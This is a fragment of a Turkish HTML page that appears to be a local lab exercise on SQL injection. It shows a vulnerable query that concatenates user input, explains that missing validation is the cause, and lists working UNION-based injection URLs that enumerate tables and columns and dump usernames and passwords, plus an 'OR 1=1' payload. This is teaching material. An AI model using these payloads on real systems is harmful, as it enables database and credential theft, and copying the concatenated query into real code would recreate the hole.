...
      			 id:&nbsp;&nbsp;<input type="text" name="id" style="width:380px;" ><br /><br />
...
.</ul></p>
					...
					<div class="panel panel-danger">
						...
						<div class="panel-body">
							...
							<pre style="margin: 1em 0; display: inherit;"><br>	$query  = "SELECT * FROM users WHERE id =$id;"; </pre>
							<ul>Açık sebebi :Oluşan sömürünün nedeni gerekli validation kontrollerinin yapılmamış olmasıdır. Kullanıcıların "yanlış" girdiden girmesini engelleyecek hiçbir şey yoksa, kullanıcı şu şekilde bir "akıllı" girdi girebilir: 	(100 OR 1=1 ).<br />    
Bu şekilde  tüm database’i elde edebilirler ya da database ile ilgili herhangi bir işlem yapabilir.
							...
							<pre style="margin: 1em 0; display: inherit;"><br><?php show_source("includes/functions.php"); ?></pre>
					...
					<div class="panel panel-warning">
						...
						<div class="panel-body">
							<ul>Tablo İsimleri:<pre> http://localhost/yazlab/index.php?id=1%20union%20select%20group_concat(table_name),1,2,3,4%20from%20information_schema.tables%20where%20table_schema=database();&gonder=G%C3%B6nder#"> </pre>
                             
                            Kolon İsimleri :<br /><pre>http://localhost/yazlab/index.php?id=1+union+select+0,1,group_concat(column_name),3,4+from+information_schema.columns+where+table_name=char(117,115,101,114,115)&gonder=Sorguyu+g%C3%B6nder#
                            </pre>
                             	Username ve Password<pre>http://localhost/yazlab/index.php?id=1+union+select+0,1,group_concat(username,0x3a,password),3,4+from+users&gonder=Sorguyu+g%C3%B6nder#
                            </pre>
                            Tüm Database:<pre>http://localhost/yazlab/index.php?id=100+or+1%3D1&gonder=G%C3%B6nder# </pre>
                           </ul>
						</div>
					</div>				
                    </div>
